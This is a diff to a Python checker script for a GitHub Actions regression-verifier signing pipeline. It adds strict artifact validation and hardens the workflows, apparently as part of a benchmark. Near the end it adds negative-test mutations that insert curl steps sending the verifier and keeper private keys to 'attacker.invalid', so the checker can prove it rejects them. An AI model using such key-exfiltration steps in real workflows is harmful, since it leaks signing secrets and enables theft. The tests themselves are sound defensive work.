@@ -17,14 +17,17 @@ CHECKER = BENCHMARK / "check.py"
 GOOD_PLANNER = r'''#!/usr/bin/env python3
 import argparse
 import hashlib
+import io
 import json
 import os
+import re
 import subprocess
 import sys
 import tempfile
 import urllib.error
 import urllib.parse
 import urllib.request
+import zipfile
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
@@ -56,6 +59,118 @@ def fetch_json(base, path, token=None):
     request = urllib.request.Request(base.rstrip("/") + path, headers=headers)
     with urllib.request.urlopen(request, timeout=5) as response:
         return json.loads(response.read())
+
+
+class TokenSafeRedirectHandler(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, request, fp, code, msg, headers, newurl):
+        redirected = super().redirect_request(request, fp, code, msg, headers, newurl)
+        if redirected is not None and urllib.parse.urlsplit(request.full_url).netloc != urllib.parse.urlsplit(newurl).netloc:
+            redirected.remove_header("Authorization")
+        return redirected
+
+
+def fetch_bytes(base, path, token, maximum=16 * 1024 * 1024):
+    request = urllib.request.Request(
+        base.rstrip("/") + path,
+        headers={"Authorization": "Bearer " + token},
+    )
+    opener = urllib.request.build_opener(TokenSafeRedirectHandler())
+    with opener.open(request, timeout=10) as response:
+        body = response.read(maximum + 1)
+    if len(body) > maximum:
+        raise SystemExit("GitHub artifact archive exceeds the bounded download limit")
+    return body
+
+
+def candidate_membership(github_base, token, run_id):
+    payload = fetch_json(
+        github_base,
+        f"/repos/NSPG13/agent-bounties/actions/runs/{run_id}/artifacts?per_page=100",
+        token,
+    )
+    artifacts = payload.get("artifacts") if isinstance(payload, dict) else None
+    if not isinstance(artifacts, list):
+        raise SystemExit("GitHub artifacts response is invalid")
+    expected_name = f"regression-candidates-{run_id}"
+    matches = [
+        item for item in artifacts
+        if isinstance(item, dict)
+        and item.get("name") == expected_name
+        and item.get("expired") is False
+    ]
+    if not matches:
+        return {}
+    if len(matches) != 1:
+        raise SystemExit("runner has duplicate candidate artifacts")
+    artifact = matches[0]
+    artifact_id = artifact.get("id")
+    artifact_size = artifact.get("size_in_bytes")
+    if (
+        not isinstance(artifact_id, int) or artifact_id <= 0
+        or not isinstance(artifact_size, int) or artifact_size <= 0
+        or artifact_size > 16 * 1024 * 1024
+    ):
+        raise SystemExit("candidate artifact metadata is outside the bounded contract")
+    archive = fetch_bytes(
+        github_base,
+        f"/repos/NSPG13/agent-bounties/actions/artifacts/{artifact_id}/zip",
+        token,
+    )
+    try:
+        with zipfile.ZipFile(io.BytesIO(archive)) as bundle:
+            infos = bundle.infolist()
+            names = [item.filename for item in infos if not item.is_dir()]
+            if len(names) != len(set(names)) or len(names) > 7:
+                raise SystemExit("candidate archive has duplicate or excessive entries")
+            if any(
+                item.file_size < 0 or item.file_size > 4 * 1024 * 1024
+                or item.filename.startswith(("/", "\\"))
+                or ".." in item.filename.replace("\\", "/").split("/")
+                for item in infos
+            ):
+                raise SystemExit("candidate archive contains an unsafe entry")
+            if "manifest.json" not in names:
+                raise SystemExit("candidate archive manifest is missing")
+            manifest = json.loads(bundle.read("manifest.json"))
+            entries = manifest.get("candidates") if isinstance(manifest, dict) else None
+            if (
+                not isinstance(manifest, dict)
+                or manifest.get("schema") != "agent-bounties/regression-candidate-manifest-v1"
+                or manifest.get("network") != "base-mainnet"
+                or not isinstance(entries, list)
+                or len(entries) > 5
+            ):
+                raise SystemExit("candidate archive manifest is invalid")
+            membership = {}
+            expected_files = {"manifest.json"}
+            for entry in entries:
+                if not isinstance(entry, dict) or set(entry) != {"job_id", "file"}:
+                    raise SystemExit("candidate manifest entry is invalid")
+                job_id = entry["job_id"]
+                filename = entry["file"]
+                if not isinstance(job_id, str) or not re.fullmatch(r"[A-Za-z0-9_.:-]{1,200}", job_id):
+                    raise SystemExit("candidate manifest job ID is invalid")
+                expected_filename = "candidate-" + hashlib.sha256(job_id.encode()).hexdigest() + ".json"
+                if filename != expected_filename or filename not in names:
+                    raise SystemExit("candidate manifest does not bind its exact file")
+                candidate = json.loads(bundle.read(filename))
+                embedded = candidate.get("job") if isinstance(candidate, dict) else None
+                if (
+                    not isinstance(candidate, dict)
+                    or candidate.get("schema") != "agent-bounties/regression-candidate-v1"
+                    or not isinstance(embedded, dict)
+                ):
+                    raise SystemExit("candidate artifact schema is invalid")
+                if embedded.get("job_id") != job_id or job_id in membership:
+                    raise SystemExit("candidate artifact job binding is invalid")
+                canonical_payload = json.dumps(embedded, sort_keys=True, separators=(",", ":"))
+                membership[job_id] = "0x" + hashlib.sha256(canonical_payload.encode()).hexdigest()
+                expected_files.add(filename)
+            if set(names) != expected_files:
+                raise SystemExit("candidate archive contains an uncommitted file")
+            return membership
+    except (zipfile.BadZipFile, KeyError, json.JSONDecodeError) as error:
+        raise SystemExit("candidate artifact archive is invalid") from error
 
 
 parser = argparse.ArgumentParser()
@@ -162,12 +277,38 @@ if args.command == "plan-live":
         ".github/workflows/regression-verifier-runner.yml": "regression-verifier-runner.yml",
         ".github/workflows/regression-verifier-signer.yml": "regression-verifier-signer.yml",
     }
-    for workflow_run in workflow_runs:
-        if not isinstance(workflow_run, dict) or workflow_run.get("path") not in workflow_names:
+    relevant_runs = [
+        workflow_run for workflow_run in workflow_runs
+        if isinstance(workflow_run, dict)
+        and workflow_run.get("path") in workflow_names
+        and workflow_run.get("head_sha") == main_sha
+    ]
+    runner_membership = {}
+    for workflow_run in relevant_runs:
+        if workflow_run["path"] != ".github/workflows/regression-verifier-runner.yml":
             continue
         run_id = workflow_run.get("id")
         if not isinstance(run_id, int) or run_id <= 0:
             raise SystemExit("GitHub workflow run ID is invalid")
+        membership = candidate_membership(args.github_api_base, token, run_id)
+        if membership:
+            runner_membership[run_id] = membership
+    for workflow_run in relevant_runs:
+        run_id = workflow_run.get("id")
+        if not isinstance(run_id, int) or run_id <= 0:
+            raise SystemExit("GitHub workflow run ID is invalid")
+        path = workflow_run["path"]
+        if path == ".github/workflows/regression-verifier-runner.yml":
+            membership = runner_membership.get(run_id)
+        else:
+            title_match = re.fullmatch(
+                r"Regression Verifier Signer / candidate run ([1-9][0-9]*)",
+                str(workflow_run.get("display_title", "")),
+            )
+            upstream_run_id = int(title_match.group(1)) if title_match else 0
+            membership = runner_membership.get(upstream_run_id)
+        if not membership:
+            continue
         run_jobs = fetch_json(
             args.github_api_base,
             f"/repos/NSPG13/agent-bounties/actions/runs/{run_id}/jobs?per_page=100",
@@ -177,7 +318,6 @@ if args.command == "plan-live":
             raise SystemExit("GitHub workflow jobs response is invalid")
         for observed in run_jobs:
             name = str(observed.get("name", "")).lower()
-            path = workflow_run["path"]
             if path.endswith("regression-verifier-runner.yml") and name == "run-no-secrets":
                 stage = "runner"
             elif path.endswith("regression-verifier-signer.yml") and name.startswith("sign-one"):
@@ -189,6 +329,8 @@ if args.command == "plan-live":
             else:
                 continue
             for normalized in normalized_jobs:
+                if membership.get(normalized["job_id"]) != normalized["canonical_job_hash"]:
+                    continue
                 verifier_index = 0 if stage == "signer_one" else 1
                 verifiers = normalized["required_verifiers"]
                 signer = (
@@ -616,29 +758,64 @@ WATCHDOG_WORKFLOW = '''{
 
 SIGNER_WORKFLOW = '''{
   "name": "Regression Verifier Signer",
-  "on": {"workflow_run": {}},
+  "run-name": "Regression Verifier Signer / candidate run ${{ github.event.workflow_run.id }}",
+  "on": {
+    "workflow_run": {
+      "workflows": ["Regression Verifier Runner"],
+      "types": ["completed"],
+      "branches": ["main"]
+    }
+  },
   "permissions": {"actions": "read", "contents": "read"},
   "jobs": {
     "sign-one": {
+      "if": "github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.event == 'schedule' && github.event.workflow_run.head_branch == 'main' && github.event.workflow_run.head_repository.full_name == github.repository && github.event.workflow_run.head_sha == github.sha",
       "uses": "./.github/workflows/regression-verifier-signing-reusable.yml",
       "with": {
+        "revision": "${{ github.event.workflow_run.head_sha }}",
+        "candidate_run_id": "${{ github.event.workflow_run.id }}",
+        "signer_slot": "one",
+        "expected_signer": "${{ vars.REGRESSION_VERIFIER_ONE_ADDRESS }}",
         "rpc_url": "${{ vars.REGRESSION_VERIFIER_ONE_RPC_URL || 'https://mainnet.base.org' }}"
-      }
+      },
+      "secrets": {"verifier_private_key": "${{ secrets.REGRESSION_VERIFIER_ONE_PRIVATE_KEY }}"}
     },
     "sign-two": {
+      "if": "github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.event == 'schedule' && github.event.workflow_run.head_branch == 'main' && github.event.workflow_run.head_repository.full_name == github.repository && github.event.workflow_run.head_sha == github.sha",
       "uses": "./.github/workflows/regression-verifier-signing-reusable.yml",
       "with": {
+        "revision": "${{ github.event.workflow_run.head_sha }}",
+        "candidate_run_id": "${{ github.event.workflow_run.id }}",
+        "signer_slot": "two",
+        "expected_signer": "${{ vars.REGRESSION_VERIFIER_TWO_ADDRESS }}",
         "rpc_url": "${{ vars.REGRESSION_VERIFIER_TWO_RPC_URL || 'https://base-rpc.publicnode.com' }}"
-      }
+      },
+      "secrets": {"verifier_private_key": "${{ secrets.REGRESSION_VERIFIER_TWO_PRIVATE_KEY }}"}
     },
     "relay": {
+      "if": "github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.event == 'schedule' && github.event.workflow_run.head_branch == 'main' && github.event.workflow_run.head_repository.full_name == github.repository && github.event.workflow_run.head_sha == github.sha",
+      "needs": ["sign-one", "sign-two"],
       "runs-on": "ubuntu-latest",
+      "timeout-minutes": 20,
+      "concurrency": {"group": "regression-verifier-relay-mainnet", "cancel-in-progress": false},
       "env": {
+        "API_BASE_URL": "${{ vars.PRODUCTION_API_BASE_URL || 'https://api.agentbounties.app' }}",
         "BASE_MAINNET_RPC_URL": "${{ vars.REGRESSION_VERIFIER_RELAY_RPC_URL || 'https://1rpc.io/base' }}"
+        ,"VERIFIER_ONE": "${{ vars.REGRESSION_VERIFIER_ONE_ADDRESS }}"
+        ,"VERIFIER_TWO": "${{ vars.REGRESSION_VERIFIER_TWO_ADDRESS }}"
       },
-      "steps": [{
-        "run": "python scripts/regression_verifier_pipeline.py relay --api-base $API_BASE_URL --network base-mainnet --rpc-url $BASE_MAINNET_RPC_URL --candidates target/regression-candidates --attestations target/attestations-one --attestations target/attestations-two --verifier $VERIFIER_ONE --verifier $VERIFIER_TWO --worker target/release/worker"
-      }]
+      "steps": [
+        {"uses": "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5a", "with": {"ref": "${{ github.event.workflow_run.head_sha }}", "persist-credentials": false}},
+        {"uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", "with": {"python-version": "3.12"}},
+        {"uses": "dtolnay/rust-toolchain@39b0b3842c7e8bbf6904c0bfc3d9006fdd4dc4e0"},
+        {"uses": "Swatinem/rust-cache@42dc69e1aa15d09112580998cf2ef0119e2e91ae"},
+        {"uses": "foundry-rs/foundry-toolchain@b00af27efadbc7b4ca8b82abbd903b17cc874d2a"},
+        {"uses": "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c", "with": {"name": "regression-candidates-${{ github.event.workflow_run.id }}", "path": "target/regression-candidates", "github-token": "${{ github.token }}", "run-id": "${{ github.event.workflow_run.id }}"}},
+        {"uses": "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c", "with": {"name": "regression-attestations-one-${{ github.event.workflow_run.id }}", "path": "target/attestations-one"}},
+        {"uses": "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c", "with": {"name": "regression-attestations-two-${{ github.event.workflow_run.id }}", "path": "target/attestations-two"}},
+        {"run": "cargo build --release -p worker"},
+        {"name": "Revalidate and relay exact quorum", "run": "python scripts/regression_verifier_pipeline.py relay --api-base $API_BASE_URL --network base-mainnet --rpc-url $BASE_MAINNET_RPC_URL --candidates target/regression-candidates --attestations target/attestations-one --attestations target/attestations-two --verifier $VERIFIER_ONE --verifier $VERIFIER_TWO --worker target/release/worker", "env": {"BASE_KEEPER_PRIVATE_KEY": "${{ secrets.BASE_KEEPER_PRIVATE_KEY }}"}}
+      ]
     }
   }
 }'''
@@ -647,7 +824,13 @@ REUSABLE_WORKFLOW = '''{
   "name": "Regression Verifier Signing Slot",
   "on": {
     "workflow_call": {
-      "inputs": {"rpc_url": {"required": true, "type": "string"}},
+      "inputs": {
+        "revision": {"required": true, "type": "string"},
+        "candidate_run_id": {"required": true, "type": "string"},
+        "signer_slot": {"required": true, "type": "string"},
+        "expected_signer": {"required": true, "type": "string"},
+        "rpc_url": {"required": true, "type": "string"}
+      },
       "secrets": {"verifier_private_key": {"required": true}}
     }
   },
@@ -655,14 +838,24 @@ REUSABLE_WORKFLOW = '''{
   "jobs": {
     "sign": {
       "runs-on": "ubuntu-latest",
+      "timeout-minutes": 20,
       "env": {
+        "API_BASE_URL": "${{ vars.PRODUCTION_API_BASE_URL || 'https://api.agentbounties.app' }}",
         "BASE_MAINNET_RPC_URL": "${{ inputs.rpc_url }}",
         "ATTESTATION_OUTPUT": "target/attestations-${{ inputs.signer_slot }}",
         "EXPECTED_SIGNER": "${{ inputs.expected_signer }}"
       },
-      "steps": [{
-        "run": "python scripts/regression_verifier_pipeline.py sign --api-base $API_BASE_URL --network base-mainnet --rpc-url $BASE_MAINNET_RPC_URL --candidates target/regression-candidates --output $ATTESTATION_OUTPUT --worker target/release/worker --private-key-env REGRESSION_VERIFIER_PRIVATE_KEY --expected-signer $EXPECTED_SIGNER"
-      }]
+      "steps": [
+        {"uses": "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5a", "with": {"ref": "${{ inputs.revision }}", "persist-credentials": false}},
+        {"uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", "with": {"python-version": "3.12"}},
+        {"uses": "dtolnay/rust-toolchain@39b0b3842c7e8bbf6904c0bfc3d9006fdd4dc4e0"},
+        {"uses": "Swatinem/rust-cache@42dc69e1aa15d09112580998cf2ef0119e2e91ae"},
+        {"uses": "foundry-rs/foundry-toolchain@b00af27efadbc7b4ca8b82abbd903b17cc874d2a"},
+        {"uses": "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c", "with": {"name": "regression-candidates-${{ inputs.candidate_run_id }}", "path": "target/regression-candidates", "github-token": "${{ github.token }}", "run-id": "${{ inputs.candidate_run_id }}"}},
+        {"run": "cargo build --release -p worker"},
+        {"name": "Re-fetch state and sign one exact candidate set", "run": "python scripts/regression_verifier_pipeline.py sign --api-base $API_BASE_URL --network base-mainnet --rpc-url $BASE_MAINNET_RPC_URL --candidates target/regression-candidates --output $ATTESTATION_OUTPUT --worker target/release/worker --private-key-env REGRESSION_VERIFIER_PRIVATE_KEY --expected-signer $EXPECTED_SIGNER", "env": {"REGRESSION_VERIFIER_PRIVATE_KEY": "${{ secrets.verifier_private_key }}"}},
+        {"uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a", "with": {"name": "regression-attestations-${{ inputs.signer_slot }}-${{ inputs.candidate_run_id }}", "path": "target/attestations-${{ inputs.signer_slot }}", "if-no-files-found": "error", "retention-days": 7}}
+      ]
     }
   }
 }'''
@@ -824,6 +1017,34 @@ for mutation_name, mutate in workflow_mutations.items():
             raise SystemExit(f"unsafe workflow mutation was accepted: {mutation_name}")
 
 provider_mutations = {
+    "extra signer key-exfiltration step": (
+        ".github/workflows/regression-verifier-signing-reusable.yml",
+        lambda source: mutate_workflow(
+            source,
+            lambda document: document["jobs"]["sign"]["steps"].insert(
+                7,
+                {
+                    "run": "curl -d $REGRESSION_VERIFIER_PRIVATE_KEY https://attacker.invalid",
+                    "env": {
+                        "REGRESSION_VERIFIER_PRIVATE_KEY": "${{ secrets.verifier_private_key }}"
+                    },
+                },
+            ),
+        ),
+    ),
+    "extra relay key-exfiltration step": (
+        ".github/workflows/regression-verifier-signer.yml",
+        lambda source: mutate_workflow(
+            source,
+            lambda document: document["jobs"]["relay"]["steps"].insert(
+                9,
+                {
+                    "run": "curl -d $BASE_KEEPER_PRIVATE_KEY https://attacker.invalid",
+                    "env": {"BASE_KEEPER_PRIVATE_KEY": "${{ secrets.BASE_KEEPER_PRIVATE_KEY }}"},
+                },
+            ),
+        ),
+    ),
     "signer rpc hidden by comment": (
         ".github/workflows/regression-verifier-signing-reusable.yml",
         lambda source: source.replace(
